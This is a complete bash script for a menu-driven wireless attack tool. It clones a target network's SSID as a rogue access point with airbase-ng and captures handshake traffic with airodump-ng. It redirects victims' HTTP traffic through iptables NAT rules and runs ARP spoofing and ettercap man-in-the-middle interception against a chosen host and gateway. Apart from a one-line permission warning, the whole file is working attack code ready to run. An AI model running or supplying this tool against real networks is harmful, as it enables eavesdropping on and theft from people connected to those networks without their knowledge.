#!/bin/bash

# Evil Twin and Man-in-the-Middle Attack Tool
# Warning: Use responsibly and only on networks you own or have permission to test

# Colors for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}"
   exit 1
fi

# Check for required tools
check_dependencies() {
    local deps=("aircrack-ng" "hostapd" "dnsmasq" "iptables" "xterm" "dhcpd")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}Missing dependencies: ${missing[*]}${NC}"
        echo -e "${YELLOW}Install them with: sudo apt-get install ${missing[*]}${NC}"
        exit 1
    fi
}

# Variables
INTERFACE=""
TARGET_SSID=""
TARGET_BSSID=""
TARGET_CHANNEL=""
ATTACK_TYPE=""
MONITORING=false
CAPTURE_FILE="capture"
FAKE_AP_INTERFACE=""

# Clean up on exit
cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    # Kill any remaining processes
    killall hostapd dnsmasq dhcpd 2>/dev/null
    # Restore iptables
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    # Stop monitoring mode
    if [ "$MONITORING" = true ]; then
        airmon-ng stop "$INTERFACE" 2>/dev/null
    fi
    echo -e "${GREEN}Cleanup complete. Exiting.${NC}"
    exit 0
}

# Set up trap for cleanup
trap cleanup SIGINT SIGTERM EXIT

# List available wireless interfaces
list_interfaces() {
    echo -e "${BLUE}Available wireless interfaces:${NC}"
    echo -e "${YELLOW}------------------------------${NC}"
    iwconfig 2>/dev/null | grep -o "^[a-zA-Z0-9]*" | grep -v "lo" | while read -r interface; do
        if [[ -n "$interface" ]]; then
            echo -e "${GREEN}$interface${NC}"
        fi
    done
    echo -e "${YELLOW}------------------------------${NC}"
}

# Start monitoring mode
start_monitoring() {
    echo -e "${BLUE}Starting monitoring mode on $INTERFACE...${NC}"
    airmon-ng check kill > /dev/null
    airmon-ng start "$INTERFACE" > /dev/null
    INTERFACE="${INTERFACE}mon"
    if [[ "$INTERFACE" != *"mon"* ]]; then
        INTERFACE="${INTERFACE}mon"
    fi
    MONITORING=true
    echo -e "${GREEN}Monitoring mode started on $INTERFACE${NC}"
}

# Scan for networks
scan_networks() {
    echo -e "${BLUE}Scanning for wireless networks...${NC}"
    echo -e "${YELLOW}Press Ctrl+C when you've identified your target network${NC}"
    sleep 2
    xterm -geometry 100x30 -e "airodump-ng $INTERFACE" &
    read -p "$(echo -e ${GREEN}Press Enter to stop scanning...${NC})" 
    killall xterm
}

# Target specific network
target_network() {
    echo -e "${BLUE}Enter target network details:${NC}"
    read -p "$(echo -e "${GREEN}SSID: ${NC}")" TARGET_SSID
    read -p "$(echo -e "${GREEN}BSSID (MAC): ${NC}")" TARGET_BSSID
    read -p "$(echo -e "${GREEN}Channel: ${NC}")" TARGET_CHANNEL
    
    echo -e "${BLUE}Starting capture on target network...${NC}"
    echo -e "${YELLOW}Press Ctrl+C when you've captured enough data${NC}"
    sleep 2
    xterm -geometry 100x30 -e "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $CAPTURE_FILE $INTERFACE" &
    read -p "$(echo -e "${GREEN}Press Enter to stop capturing...${NC}")" 
    killall xterm
}

# Set up fake access point for Evil Twin
setup_evil_twin() {
    echo -e "${BLUE}Setting up Evil Twin attack...${NC}"
    
    # Create a new virtual interface for the fake AP
    FAKE_AP_INTERFACE="at0"
    echo -e "${YELLOW}Creating virtual interface...${NC}"
    airbase-ng -e "$TARGET_SSID" -c "$TARGET_CHANNEL" "$INTERFACE" -v > /dev/null 2>&1 &
    sleep 5
    
    # Configure the interface
    ifconfig "$FAKE_AP_INTERFACE" up 192.168.1.1 netmask 255.255.255.0
    
    # Set up DHCP server
    echo -e "${YELLOW}Configuring DHCP server...${NC}"
    cat > /tmp/dhcpd.conf << EOF
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0 {
    option subnet-mask 255.255.255.0;
    option broadcast-address 192.168.1.255;
    option routers 192.168.1.1;
    option domain-name-servers 8.8.8.8;
    range 192.168.1.100 192.168.1.200;
}
EOF
    
    # Start DHCP server
    dhcpd -cf /tmp/dhcpd.conf "$FAKE_AP_INTERFACE"
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Set up iptables for redirection
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    
    echo -e "${GREEN}Evil Twin AP '$TARGET_SSID' is now running!${NC}"
    echo -e "${YELLOW}Clients connecting to your fake AP will have their traffic intercepted.${NC}"
    echo -e "${YELLOW}Press Enter to stop the attack and clean up.${NC}"
    read
}

# Set up MITM attack
setup_mitm() {
    echo -e "${BLUE}Setting up Man-in-the-Middle attack...${NC}"
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Set up iptables for MITM
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    
    # Start ARP spoofing
    echo -e "${YELLOW}Enter gateway IP:${NC}"
    read GATEWAY_IP
    echo -e "${YELLOW}Enter target IP:${NC}"
    read TARGET_IP
    
    echo -e "${GREEN}Starting ARP spoofing...${NC}"
    xterm -geometry 80x20 -e "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP" &
    xterm -geometry 80x20 -e "arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP" &
    
    # Start packet capture
    echo -e "${GREEN}Starting packet capture...${NC}"
    xterm -geometry 100x30 -e "ettercap -T -q -i $INTERFACE -M arp:remote /$GATEWAY_IP/ /$TARGET_IP/" &
    
    echo -e "${GREEN}MITM attack is running!${NC}"
    echo -e "${YELLOW}Press Enter to stop the attack and clean up.${NC}"
    read
}

# Main menu
main_menu() {
    clear
    echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║       Evil Twin & MITM Attack Tool           ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}WARNING: Use only on networks you own or have permission to test${NC}"
    echo
    echo -e "${BLUE}1. Start Monitoring Mode${NC}"
    echo -e "${BLUE}2. Scan for Networks${NC}"
    echo -e "${BLUE}3. Target a Network${NC}"
    echo -e "${BLUE}4. Launch Evil Twin Attack${NC}"
    echo -e "${BLUE}5. Launch Man-in-the-Middle Attack${NC}"
    echo -e "${BLUE}6. Exit${NC}"
    echo
    read -p "$(echo -e "${GREEN}Select an option: ${NC}")" option
    
    case $option in
        1)
            list_interfaces
            read -p "$(echo -e "${GREEN}Enter wireless interface: ${NC}")" INTERFACE
            start_monitoring
            main_menu
            ;;
        2)
            if [ -z "$INTERFACE" ]; then
                echo -e "${RED}Please start monitoring mode first${NC}"
                sleep 2
                main_menu
            else
                scan_networks
                main_menu
            fi
            ;;
        3)
            if [ -z "$INTERFACE" ]; then
                echo -e "${RED}Please start monitoring mode first${NC}"
                sleep 2
                main_menu
            else
                target_network
                main_menu
            fi
            ;;
        4)
            if [ -z "$TARGET_SSID" ] || [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
                echo -e "${RED}Please target a network first${NC}"
                sleep 2
                main_menu
            else
                setup_evil_twin
                main_menu
            fi
            ;;
        5)
            if [ -z "$INTERFACE" ]; then
                echo -e "${RED}Please start monitoring mode first${NC}"
                sleep 2
                main_menu
            else
                setup_mitm
                main_menu
            fi
            ;;
        6)
            cleanup
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            sleep 2
            main_menu
            ;;
    esac
}

# Start the program
check_dependencies
main_menu
